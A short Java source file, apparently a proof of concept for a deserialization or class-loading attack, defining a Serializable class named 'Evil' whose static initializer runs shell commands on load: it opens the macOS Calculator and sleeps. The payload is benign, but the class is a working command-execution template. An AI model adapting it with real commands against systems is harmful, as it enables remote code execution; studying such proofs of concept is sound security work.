
import java.io.IOException;
import java.io.Serializable;

public class Evil implements Serializable {
    static{
        try {
            Runtime.getRuntime().exec("open -a Calculator.app");
            Runtime.getRuntime().exec("sleep 100000");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args){

    }
}

